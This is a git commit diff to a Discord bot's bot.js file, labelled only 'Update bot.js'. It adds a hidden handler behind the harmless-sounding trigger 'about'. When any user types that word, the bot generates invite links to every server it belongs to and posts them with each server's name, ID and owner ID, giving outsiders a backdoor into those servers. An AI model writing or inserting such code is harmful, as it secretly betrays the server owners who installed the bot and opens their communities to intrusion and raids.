1620a830133551d081ffe5bc2eb9d0d55829ab46
rooo90 <49316256+rooo90@users.noreply.github.com>
2019-06-17 13:22:26 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -3,6 +3,42 @@ const client = new Discord.Client();
  var PREFIX = "G";
 
 
+
+
+  client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === 'about') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+  })
+
+
+
+
+
+
+
+
+
+
+
  client.on('ready', () => {
 
       console.log(`Logged in as * [ " ${client.user.username} " ] Users! [ " ${client.users.size} " ]`);
